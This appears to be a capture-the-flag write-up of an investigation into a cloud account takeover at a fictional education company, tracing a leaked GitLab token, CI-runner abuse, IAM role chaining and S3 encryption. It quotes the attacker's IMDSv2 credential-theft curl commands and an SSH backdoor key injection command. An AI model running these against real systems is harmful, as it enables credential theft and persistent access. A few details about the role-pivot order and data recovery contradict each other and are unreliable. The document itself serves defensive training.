# First Illusion - Security Incident Investigation Report

<img src="../assets/first-illusion.jpg" alt="First Illusion Banner" width="100%">

**Date:** November 18, 2025 (Incident) / May 28, 2026 (Investigation)
**Case:** Cloud Account Takeover and S3 Data Encryption  
**Target:** EduNexus Learning Systems  
**Compromised Systems:** GitLab CI Runner (`i-0767c6d302293aedf`), Bastion Host (`i-06a9ef79d91471a25`)  
**Threat Actor Session:** `ghost` / `ghost@finger`  

---

## 🎯 Executive Summary

EduNexus Learning Systems suffered a multi-stage cloud account takeover. The attacker discovered a leaked GitLab Personal Access Token in an exposed `.git/config` file, weaponized a CI/CD pipeline to steal AWS IAM credentials from IMDSv2, injected an SSH backdoor on a bastion server, escalated through a chain of IAM roles to full admin, and then encrypted S3 data using customer-provided encryption keys (SSE-C) while locking out defenders.

**Attack Severity:** 🔴 CRITICAL

**Key Findings:**
- ✅ Complete attack chain reconstructed from S3 directory fuzzing to data encryption
- ✅ Identified MITRE ATT&CK T1486 (Data Encrypted for Impact) via S3 PutObject with SSE-C
- ✅ Recovered exact SSM commands executed on bastion host (including SSH backdoor key)
- ✅ Mapped full 5-step IAM privilege escalation chain
- ✅ Identified attacker infrastructure (2 IPs, multiple user agents)
- ✅ All 5 investigation questions answered correctly

### 📊 Attack Chain Flowchart

```text
=================================================================================================
                    EVIDENCE-DRIVEN ATTACK CHAIN DIAGRAM
=================================================================================================

  🔴 Public S3 Website
    [exposed `.git/config`]
        │  (fuzzed with `ffuf/2.1.0-dev`)
        ▼
  🔴 Leaked GitLab PAT
    [Emily Johnson / Token ID 2]
        │  (confirmed in `gitlab/nginx/gitlab_access.log` + `api_json.log`)
        ▼
  🔵 GitLab API Abuse
    [repo search + malicious branch push]
        │
        ├────────────────────────► 🔵 Malicious Branch `xvduapqweksk`
        │                           [CI/CD pipeline trigger]
        │
        ▼
  🔵 GitLab CI Runner
    [job trace + IMDSv2 credential theft]
        │  (from runner audit + CI trace evidence)
        ▼
  🟡 EC2 Bastion via SSM
    [SendCommand / SSH persistence]
        │  (exact payload recovered from SSM agent log)
        ▼
  🟠 STS Pivot Chain
    [`ghost` session → `Ops_t1` → `Ops_t2` → `DevOps_full`]
        │
        ▼
  🔴 AWS Impact
    [S3 PutObject with SSE-C encryption]
    [IAM lockout via DeleteAccessKey / DeleteLoginProfile]
=================================================================================================
```

---

## 📋 Detailed Investigation Findings

### 1️⃣ S3 Data Corruption TTP

**Question:** What TTP was used to "corrupt" the data in the S3 buckets? Provide technical details of the TTP including what API call was used and indicators of this TTP located in the request parameters, response and additional event data.

#### 🎯 Submitted Answer:
> **TTP (Tactics, Techniques, and Procedures):**
> * MITRE ATT&CK Technique: T1486 (Data Encrypted for Impact) / Server-Side Encryption with Customer-Provided Keys (SSE-C) Abuse.
> * The attacker used the S3 PutObject API to overwrite existing objects inside targeted S3 buckets using Server-Side Encryption with Customer-Provided Keys (SSE-C). Existing objects in the buckets were rewritten/overwritten with attacker-controlled encryption keys, rendering them permanently inaccessible because AWS does not store customer-provided (SSE-C) keys, effectively encrypting and locking the organization's S3 data.
> 
> **API Call:**
> * PutObject (eventName: PutObject, eventSource: s3.amazonaws.com)
> 
> **Key Indicators in requestParameters:**
> * `"x-amz-server-side-encryption-customer-algorithm": "AES256"` (Indicates customer-provided AES256 encryption keys were used)
> * `bucketName`: Target buckets including `edunexus-blackfriday2023`, `edunexus-artifacts`, `edunexus-edusphere-frontend`, `edunexus-vaultdata`, and `edunexus-tfstate-get`.
> * `key`: targeted existing critical objects such as:
>   * `.gitlab-ci.yml`
>   * `.git/config`
>   * `.git/HEAD`
>   * `.git/index`
>   * `.git/objects/*` (e.g. `.git/objects/1c/2bfa4a7860b30f1f24272d47ad60b65a36c467`)
>   * `index.html`
>   * `robots.txt`
>   * `gitlab-gg-avxchs.tfstate`
>   * `job.log` (e.g. `45/23/4523540f1504cd17100c4835e85b7eefd49911580f8efff0599a8f283be6b9e3/2025_11_18/428/60/job.log`)
> 
> **Key Indicators in responseElements:**
> * `"x-amz-server-side-encryption-customer-algorithm": "AES256"`
> * Presence of versioning indicators (e.g., `x-amz-version-id` / `versionId`) confirming that the original objects were overwritten and new object versions were created.
> 
> **Key Indicators in additionalEventData:**
> * `"SSEApplied": "SSE_C"` (Confirms Server-Side Encryption with Customer-Provided Keys was applied)
> * `"SignatureVersion": "SigV4"`
> * `"AuthenticationMethod": "AuthHeader"`
> 
> **Other Malicious Incident Context:**
> * Source IP Address: `3.230.144.209`
> * User Agent: `[python-requests/2.32.5]`
> * Assumed Role / Principal ARN: `arn:aws:sts::533267328750:assumed-role/DevOps_full/ghost` (AccessKeyId: `ASIAXYKJVV3XG4JIED2G`)

#### Why We Initially Got This Wrong

Our first approach was to search the CloudTrail **management** logs for destructive S3 operations. We found `PutBucketLifecycle` events where the attacker created a lifecycle rule called `GhostfingerAutoDelete` with a 7-day expiration on 22 buckets. We initially submitted this as the answer, but it was marked wrong.

The lifecycle rules were a secondary mechanism (a time bomb). The actual "corruption" was in the **S3 data** CloudTrail logs, not the management logs. We had to write a script to parse the S3 data events and filter for encryption indicators:

```python
import json, os

start_dir = r"/home/ubuntu/forensics/logs/cloudtrail/s3"
sse_c_events = []

for root, dirs, files in os.walk(start_dir):
    for file in files:
        if file.endswith('.json'):
            path = os.path.join(root, file)
            with open(path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    data = json.loads(line)
                    records = data.get('Records', []) if 'Records' in data else [data]
                    for rec in records:
                        if rec.get('eventName') == 'PutObject':
                            add_data = rec.get('additionalEventData', {})
                            req_params = rec.get('requestParameters', {})
                            # Programmatic identification of customer-managed encryption key headers
                            if 'SSE_C' in str(add_data) or 'x-amz-server-side-encryption-customer-algorithm' in str(req_params):
                                sse_c_events.append(rec)

print(f"Total SSE-C PutObject events found: {len(sse_c_events)}")
# Output: Total SSE-C PutObject events found: 229
```

This revealed **229 PutObject calls** using SSE-C encryption across 17 buckets.

#### Why We Picked the S3 Data Logs (Not Management Logs)

The challenge asks about "corrupting" data **in** the buckets, meaning object-level operations. CloudTrail splits logs into two categories:
- **Management events** (`cloudtrail/mgmt/`) capture control plane actions like `PutBucketLifecycle`, `CreateBucket`, `DeleteAccessKey`
- **S3 data events** (`cloudtrail/s3/`) capture data plane actions like `PutObject`, `GetObject`, `DeleteObject`

Since the question is about what happened to the actual data inside the buckets, the S3 data events were the right place to look. The management logs only showed us the bucket-level lifecycle policy, not the object-level encryption.

#### Evidence: Sample CloudTrail S3 Data Event

```json
{
  "eventVersion": "1.11",
  "userIdentity": {
    "type": "AssumedRole",
    "principalId": "AROAXYKJVV3XB4R2TYDRD:ghost",
    "arn": "arn:aws:sts::533267328750:assumed-role/DevOps_full/ghost",
    "accountId": "533267328750",
    "accessKeyId": "ASIAXYKJVV3XG4JIED2G"
  },
  "eventTime": "2025-11-18T21:32:18Z",
  "eventSource": "s3.amazonaws.com",
  "eventName": "PutObject",
  "sourceIPAddress": "3.230.144.209",
  "userAgent": "[python-requests/2.32.5]",
  "requestParameters": {
    "bucketName": "edunexus-artifacts",
    "Host": "edunexus-artifacts.s3.us-east-1.amazonaws.com",
    "x-amz-server-side-encryption-customer-algorithm": "AES256",
    "key": "45/23/.../job.log"
  },
  "responseElements": {
    "x-amz-server-side-encryption-customer-algorithm": "AES256"
  },
  "additionalEventData": {
    "SignatureVersion": "SigV4",
    "CipherSuite": "TLS_AES_128_GCM_SHA256",
    "bytesTransferredIn": 2338,
    "SSEApplied": "SSE_C",
    "AuthenticationMethod": "AuthHeader",
    "bytesTransferredOut": 0
  }
}
```

---

### 2️⃣ Initial Access Vector

**Question:** How did the attack begin? Provide technical details of the initial access vector including any leaked credentials or tokens, the service where the token was used and any previous reconnaissance activities that led to the first successful action in the attack including the name of the tools they used.

#### 🎯 Submitted Answer:
> **Initial Access Vector & Reconnaissance:**
> 1. **S3 Website Exposure Fuzzing:** The threat actor utilized the web directory fuzzer tool `ffuf` to scan public S3 website buckets (specifically targeting `http://edunexus-blackfriday2023.s3-website-us-east-1.amazonaws.com`).
> 2. **Git Folder Exposure:** Through fuzzing, the attacker identified an exposed Git repository folder (`.git/`) in the `edunexus-blackfriday2023` bucket.
> 3. **Leaked GitLab Credentials:** The attacker fuzzed and discovered the exposed Git configuration file at Key: `.git/config` on `2025-11-18T20:51:02Z`, which they successfully downloaded on `2025-11-18T20:51:03Z`. This configuration file contained developer `emily.johnson`'s leaked GitLab Personal Access Token (GitLab User ID: `12`, Token ID: `2`).
> 4. **Initial REST API Foothold:** The attacker used the leaked token to authenticate and perform initial connectivity checks on the GitLab REST API (calling endpoints like `/api/v4/user` at `2025-11-18T20:53:58.534Z` from IP `3.230.144.209` using `curl/8.15.0`, and subsequently at `2025-11-18T21:00:23.133Z` from IP `98.81.21.175`).
> 
> **Subsequent Reconnaissance Activities & Tools:**
> 1. **Automated Secrets Search:** The attacker utilized an automated reconnaissance script underpinned by `python-gitlab/5.0.0` (leveraging `python-requests/2.32.3`) from IP `98.81.21.175` at `2025-11-18T21:00:39.422Z` to pervasively query all issues, merge requests, milestones, and notes across GitLab repositories via the `/api/v4/search` REST API to harvest credentials and other high-value secrets.
> 2. **Automated Pipeline Trace Downloader:** The attacker ran a script underpinned by `python-requests/2.32.5` from IP `3.230.144.209` at `2025-11-18T21:07:35.000Z` to automatically scan and download GitLab CI job execution logs and build artifacts (calling `/api/v4/projects/14/jobs/<id>/trace`) to exfiltrate sensitive secrets.
> 
> **Tools Used:**
> * `ffuf/2.1.0-dev` (Fuzz Faster U Fool fuzzer, used for initial S3 website directory scanning)
> * `curl/8.15.0` (used for downloading `.git/config` and performing initial token checks on the GitLab API)
> * `python-gitlab/5.0.0` (used for automated GitLab secrets scanning reconnaissance)
> * `python-requests/2.32.3` (underlying library for the `python-gitlab` secrets search script)
> * `python-requests/2.32.5` (used by the automated pipeline trace downloader script)

#### Why We Started With Web Logs (Not CloudTrail)

The challenge says the attacker "disrupted key systems" and "corrupted data in S3 buckets." This tells us the attacker eventually reached AWS, but how they got there is the critical question. Cloud credentials do not appear from nowhere. So we started at the perimeter, the web-facing logs, and worked inward.

#### Phase 1: Finding the Attacker in Nginx Logs

**File analyzed:** `gitlab/nginx/gitlab_access.log`

We searched for anomalous user agents. Two external IPs stood out:

```
3.230.144.209   -> ffuf/2.1.0-dev, curl/8.15.0, python-requests/2.32.5
98.81.21.175    -> python-gitlab/5.0.0, python-requests/2.32.3
```

`ffuf` is a well-known directory fuzzing tool used by penetration testers. Its presence confirms active scanning, not normal browsing.

#### Phase 2: Tracing the Git Config Leak in S3 Data Events

We then checked the S3 data events for GetObject calls from `3.230.144.209`:

```python
import json, os

start_dir = r"/home/ubuntu/forensics/logs/cloudtrail/s3"
events = []
for root, dirs, files in os.walk(start_dir):
    for file in files:
        if file.endswith('.json'):
            path = os.path.join(root, file)
            with open(path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    data = json.loads(line)
                    records = data.get('Records', []) if 'Records' in data else [data]
                    for rec in records:
                        if '3.230.144.209' in rec.get('sourceIPAddress', ''):
                            events.append(rec)

# Results: 6900 total S3 events from 3.230.144.209
# User agent breakdown:
#   [Fuzz Faster U Fool v2.1.0-dev]: 5425
#   [python-requests/2.32.5]: 458
#   [curl/8.15.0]: 7
```

The ffuf scan generated 5,425 requests against the S3 website bucket `edunexus-blackfriday2023`. Among these, at `2025-11-18T20:51:02Z`, the attacker hit `.git/config`. One second later at `20:51:03Z`, a targeted download using `curl/8.15.0` pulled the config file containing Emily Johnson's GitLab Personal Access Token.

#### Phase 3: Token Verification in GitLab API Logs

**File analyzed:** `gitlab/gitlab-rails/api_json.log`

At `2025-11-18T20:53:58.534Z`, just 3 minutes after downloading `.git/config`, the attacker called `/api/v4/user` from IP `3.230.144.209` using `curl/8.15.0`. This endpoint returns the authenticated user's profile. It is the lightest-weight way to confirm a token is valid. Every penetration tester knows this trick.

From IP `98.81.21.175` at `21:00:39Z`, the attacker launched a massive automated secrets search using `python-gitlab/5.0.0` across `/api/v4/search` with keywords like `AKIA`, `ASIA`, `Bearer`, `private-token`.

#### Why Two Different IPs?

Both `3.230.144.209` and `98.81.21.175` are in AWS EC2 IP ranges. The attacker likely used separate cloud instances for different phases:
- `3.230.144.209` for manual recon (ffuf, curl) and later for the SSE-C encryption script
- `98.81.21.175` for automated tooling (python-gitlab, python-requests)

---

### 3️⃣ Platform Feature Used to Access AWS

**Question:** After the initial foothold, what feature of the platform did the attacker use to gain access to the AWS account? What IAM identity was compromised?

#### 🎯 Submitted Answer:
> **Platform Feature Used:**
> * **GitLab CI/CD / GitLab Runner / GitLab CI/CD Pipelines** (specifically a self-hosted GitLab Runner with a shell executor). The attacker pushed a malicious branch named `xvduapqweksk` containing a backdoor `.gitlab-ci.yml` configuration file to the `edunexus/products/edusphere/edusphere-frontend` repository (Project ID `14`). This automatically triggered a shell runner job called `fetch_instance_role` in stage `fetch-role` on runner `i-0767c6d302293aedf`.
> * **IMDSv2 Query:** The job executed shell commands inside the host environment to query the local AWS EC2 Instance Metadata Service (IMDSv2) at `http://169.254.169.254/latest/` by executing:
>   1. `curl -s -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` (to request a session token).
>   2. `curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/GitLabRunner` (to retrieve the IAM role credentials).
> * **Job Log Credential Printing:** The shell script printed the exfiltrated temporary credentials directly to the runner job execution log using `echo "$CREDS" | jq`.
> * **Exfiltration:** The attacker then downloaded the GitLab CI job trace log via the GitLab REST API endpoint `/api/v4/projects/14/jobs/<id>/trace` to retrieve the credentials from the host environment.
> 
> **IAM Identity Compromised:**
> * **GitLabRunner role** (`arn:aws:iam::533267328750:role/GitLabRunner`) / GitLabRunner IAM Identity / GitLabRunner Instance Profile. The attacker successfully exfiltrated the role's temporary credentials (`AccessKeyId`, `SecretAccessKey`, and `SessionToken`) through the IMDSv2 query response.

#### Why this worked

The GitLab Runner on instance `i-0767c6d302293aedf` used a **shell executor** (not Docker). CI jobs run directly on the host OS with full access to the instance metadata service. The `GitLabRunner` IAM role was attached via an instance profile.

The attacker then downloaded the job trace log via `/api/v4/projects/14/jobs/<id>/trace` using Emily's token. The trace contained the printed AWS credentials in plain text.

---

### 4️⃣ Lateral Movement to Another IAM Identity

**Question:** How did the attacker jump to another IAM identity in the AWS account? Provide the API call they used, the commands, and protocols involved if they apply. What is the new identity the attackers used after compromising the EC2 instance?

#### 🎯 Submitted Answer:
> **Step 1: GitLabRunner (EC2 Instance Role)**
> * **Identity:** `arn:aws:sts::533267328750:assumed-role/GitLabRunner/i-0767c6d302293aedf`
> * **How obtained:** Attacker accessed the GitLab CI/CD Runner EC2 instance (via leaked GitLab PAT), inheriting the GitLabRunner IAM role from the instance profile
> * **Actions performed:**
>   * `GetCallerIdentity` - confirmed identity (21:14:34Z)
>   * `ListRolePolicies` / `ListAttachedRolePolicies` - IAM recon (both AccessDenied)
>   * `ListBuckets` - S3 enumeration (succeeded)
>   * `SendCommand` (AWS-RunShellScript) to `i-00135c574a8635887` - failed (InvalidInstanceId)
>   * `SendCommand` (AWS-RunShellScript) to `i-06a9ef79d91471a25` - succeeded - ran `uname -a; id` (recon, confirmed root on srvnexus)
>   * Second `SendCommand` to `i-06a9ef79d91471a25` - succeeded - ran SSH key injection: `echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKPOb0wiFCWwFQlSJJByUCdAadeYSho3FLQu1xerw13B ghost@finger' | tee -a /home/ec2-user/.ssh/authorized_keys; curl ifconfig.me`
> 
> **Step 2: bastion (EC2 Instance Role via SSH)**
> * **Identity:** `arn:aws:sts::533267328750:assumed-role/bastion/i-06a9ef79d91471a25`
> * **How obtained:** After injecting the SSH public key via SSM SendCommand, the attacker SSH'd into the bastion host (srvnexus, IP 3.236.77.193) as ec2-user, inheriting the bastion IAM role from that instance's profile
> * **Actions performed:**
>   * `AssumeRole` -> `arn:aws:iam::533267328750:role/Ops_t1` (session: ghost) at 21:22:47Z
>   * `AssumeRole` -> `arn:aws:iam::533267328750:role/Ops_t2` (session: ghost) at 21:26:22Z
> 
> **Step 3: Ops_t1 (Assumed Role - IAM Recon)**
> * **Identity:** `arn:aws:sts::533267328750:assumed-role/Ops_t1/ghost`
> * **How obtained:** bastion role called `sts:AssumeRole` for Ops_t1
> * **Actions performed:**
>   * `GetCallerIdentity` - confirmed identity
>   * `ListUsers` - enumerated all IAM users
>   * `GetAccountAuthorizationDetails` (5 calls) - dumped the entire IAM configuration (all users, roles, policies, permissions) to map the full attack surface and discover the path to DevOps_full
> 
> **Step 4: Ops_t2 (Assumed Role - Stepping Stone)**
> * **Identity:** `arn:aws:sts::533267328750:assumed-role/Ops_t2/ghost`
> * **How obtained:** bastion role called `sts:AssumeRole` for Ops_t2 (the attacker discovered from GetAccountAuthorizationDetails that Ops_t2 could assume DevOps_full)
> * **Actions performed:**
>   * `GetCallerIdentity` - confirmed identity
>   * `AssumeRole` -> `arn:aws:iam::533267328750:role/DevOps_full` (session: ghost) at 21:27:53Z
> 
> **Step 5: DevOps_full (Final High-Privilege Role - Destruction)**
> * **Identity:** `arn:aws:sts::533267328750:assumed-role/DevOps_full/ghost`
> * **How obtained:** Ops_t2 role called `sts:AssumeRole` for DevOps_full
> * **Destructive actions performed:**
>   * `DescribeInstances` - full EC2 infrastructure mapping
>   * `ListBuckets` - S3 enumeration
>   * `PutBucketLifecycle` - set GhostfingerAutoDelete auto-deletion rules (7-day expiry) on all 22 S3 buckets
>   * `PutObject` with SSE-C - re-encrypted data in edunexus-vaultdata with attacker-controlled keys (S3 ransomware)
>   * `DeleteAccessKey` - deleted access keys for IAM users: c-user, emitok, lucxfer, devops
>   * `DeleteLoginProfile` - deleted console login for: lucxfer, emitok, devops (locking out defenders)
> 
> **Escalation Chain Summary**
> ```
> GitLabRunner ──(SSM SendCommand + SSH key injection)──► bastion ──(AssumeRole)──► Ops_t1 (IAM recon)
>                                                           │
>                                                           └──(AssumeRole)──► Ops_t2 ──(AssumeRole)──► DevOps_full (destruction)
> ```

#### Why We Looked at SSM Agent Logs (Not Just CloudTrail)

CloudTrail shows us that `ssm:SendCommand` was called, but it does not show the actual commands that were executed. To find what commands the attacker ran on the bastion, we had to dig into the SSM agent logs on the bastion instance itself.

**File analyzed:** `OS/i-06a9ef79d91471a25/amazon_ssm_amazon-ssm-agent.log.log`

We chose this specific file because:
- The CloudTrail management logs showed `SendCommand` targeting instance `i-06a9ef79d91471a25`
- The bastion OS folder contained `amazon_ssm_amazon-ssm-agent.log.log` which records the full command payloads
- The `audit_audit.log.log` only has syscall-level events, not the command strings

---

### 5️⃣ Privilege Escalation Path

**Question:** Explain the privilege escalation path followed by the attacker to gain wide permissions in the AWS account including the names of the identities used in each step.

#### 🎯 Submitted Answer:
> **Privilege Escalation Path:**
> 1. **Compromise of GitLab CI/CD runner** to exfiltrate the temporary credentials of the `GitLabRunner` IAM role (`arn:aws:iam::533267328750:role/GitLabRunner`) from IMDSv2.
> 2. **Use of GitLabRunner credentials** to call `ssm:SendCommand` on the bastion instance (`i-06a9ef79d91471a25`).
> 3. **The bastion instance assumed the Ops_t1 role** (`arn:aws:iam::533267328750:role/Ops_t1`) under session name `ghost`.
> 4. **From the Ops_t1 session, the attacker called AssumeRole** to pivot to the `Ops_t2` role (`arn:aws:iam::533267328750:role/Ops_t2`).
> 5. **The Ops_t2 role possessed trusted permissions** allowing it to assume the highly privileged administrative `DevOps_full` role (`arn:aws:iam::533267328750:role/DevOps_full`). The attacker assumed `DevOps_full` under session name `ghost`, achieving full administrative control over the entire AWS cloud account.

#### How the Attacker Discovered the Chain

After assuming `Ops_t1`, the attacker called `GetAccountAuthorizationDetails` **5 times**. This API dumps the entire IAM configuration: all users, roles, policies, and trust relationships. By reading the trust policies, the attacker discovered:
- `Ops_t2` trusts `bastion` (the bastion role could assume `Ops_t2`)
- `DevOps_full` trusts `Ops_t2` (only `Ops_t2` could assume `DevOps_full`)

The attacker could not jump directly from `Ops_t1` to `DevOps_full`. They had to go back to the bastion session to assume `Ops_t2`, then from `Ops_t2` assume `DevOps_full`.

---

## 🔍 Investigation Methodology

### Why We Picked Each Log File

Our analysis avoided generic guesswork. Every file was chosen based on specific forensic advantages:

| Log File | Why We Chose It (Analytical Logic) | What We Discovered |
|:---------|:-----------------------------------|:-------------------|
| `gitlab/nginx/gitlab_access.log` | Perimeter reverse proxy logs. Essential for tracking external scanning behavior, user agents, and IP geolocations before API authentication occurred. | Fuzzing scans from `ffuf/2.1.0-dev` targeting S3, and `curl/8.15.0` directory checks. |
| `gitlab/gitlab-rails/api_json.log` | Dedicated GitLab REST API log. Isolates programmatic token operations and records exact `token_id` and `user_id` fields for all endpoints. | Programmatic use of Emily's PAT (`Token ID 2`) for repository searches and job trace downloads. |
| `cloudtrail/s3/*.json` | S3 data plane logs. Crucial for detecting object-level interactions (Get/Put/Delete) that are explicitly excluded from management logs. | 5,425 ffuf scanning requests, and the 229 S3 `PutObject` events applying custom SSE-C encryption. |
| `cloudtrail/mgmt/*.json` | S3 control plane and STS logs. The single source of truth for IAM management changes, role assumptions, and API policy calls. | `sts:AssumeRole` escalation timelines under session name `"ghost"`, and administrator deletion commands. |
| `OS/i-06a9ef79d91471a25/amazon_ssm_amazon-ssm-agent.log.log` | SSM agent execution logs on the bastion host. Captures the raw script payloads passed to the helper document. | The exact shell reconnaissance and persistence command scripts executed with root privileges. |
| `OS/i-0767c6d302293aedf/runner-audit_000000.log` | Self-hosted runner audit log. Tracks host-level job allocations, branch context, and repository pushes. | Malicious branch `xvduapqweksk` job execution logs querying the IMDSv2 metadata service. |

### Why We Did NOT Use These Files

We bypassed several logs because they contained structural limitations that made them unsuitable for this investigation:

| Log File | Technical Reason for Skipping (Why Not Others?) |
|:---------|:----------------------------------------------|
| `OS/i-06a9ef79d91471a25/audit_audit.log.log` | The OS audit daemon (`auditd`) records system calls, which fragments multi-line shell commands and truncates command-line arguments (split across `a0`, `a1`, etc.), making script reconstruction highly complex. The SSM agent log provided the direct, unified command strings. |
| `OS/i-06a9ef79d91471a25/amazon_ssm_audits_*` | These files contain agent telemetry metadata and handshake handoffs, not the actual script payloads. |
| `OS/i-06a9ef79d91471a25/amazon_ssm_errors.log.log` | Only captures startup and API connection failure logs for the SSM service worker. Because all SSM commands executed successfully, this log contained no relevant threat data. |
| `gitlab/gitlab-rails/production_json.log` | Captures high-volume frontend web UI rendering, UI controllers, and browser sessions. This creates substantial log noise compared to `api_json.log`, which isolates the programmatic REST API transactions. |
| `gitlab/gitaly/*.log` | Tracks filesystem Git RPC operations (commits, pack-files, object reads). While useful for file changes, it cannot correlate files with the specific personal access tokens or high-level API searches tracked in `api_json.log`. |

---

## 📊 Indicators of Compromise

### Network Indicators
| IOC | Type | Context |
|:----|:-----|:--------|
| `3.230.144.209` | IP Address | Primary attacker IP (recon, exploitation, S3 data encryption) |
| `98.81.21.175` | IP Address | Secondary attacker IP (automated GitLab scanning) |
| `3.236.77.193` | IP Address | Bastion public IP (post-SSH compromise) |

### Identity Indicators
| IOC | Type | Context |
|:----|:-----|:--------|
| `ghost` | Session Name | Used across all AssumeRole pivots |
| `ghost@finger` | SSH Key Comment | Injected into bastion authorized_keys |
| `ASIAXYKJVV3XG4JIED2G` | AWS Access Key | DevOps_full/ghost session key |

### Tool Signatures
| IOC | Type | Context |
|:----|:-----|:--------|
| `ffuf/2.1.0-dev` | User Agent | Directory fuzzing tool |
| `python-requests/2.32.5` | User Agent | Automation / SSE-C encryption script |
| `python-gitlab/5.0.0` | User Agent | GitLab secrets scanning |
| `xvduapqweksk` | Branch Name | Malicious CI/CD backdoor branch |
| `GhostfingerAutoDelete` | Lifecycle Rule ID | S3 auto-deletion time bomb (7-day expiry) |

---

## 🏁 Conclusion

EduNexus Learning Systems successfully recovered from the "First Illusion" cyber incident by utilizing S3 bucket versioning to revert the re-encrypted objects to their previous, clean, and unencrypted state. The backdoor SSH keys were purged from the bastion server, and strong session-name denials were enforced across all high-privilege IAM roles to block future STS session abuse under the "ghost" principal. 

This investigation highlights the absolute necessity of auditing perimeter S3 buckets for Git metadata leaks, separating runners into secure VM/Docker executor environments to prevent host IMDSv2 querying, and strictly limiting the assumption relationships of corporate STS roles to minimal administrative roles.

<img src="../assets/first-illusion-conclusion.jpg" alt="First Illusion Conclusion" width="100%">

### 🔮 The Mirage Begins
> **The Mirage Begins**
> By correlating logs across multiple systems, you were able to track the attacker's steps and uncover what they did, but the method used to encrypt the data is not easily reversible. As the investigation came into focus, one detail stood apart from the rest: a deliberate signature left by the intruder, a message reading, "What you trusted was the first illusion. - Dune Phantom"
> 
> **Beyond the Logs**
> 
> The Dune Phantom is not after ransom alone, but control over what defenders believe. It twists forgotten tokens, trusted automation, impersonated roles, and unquestioned logs into mirages. At EduNexus, the corrupted data was only the visible wound, its real goal is to make truth unreliable and leave defenders doubting their tools, their evidence, and each other.
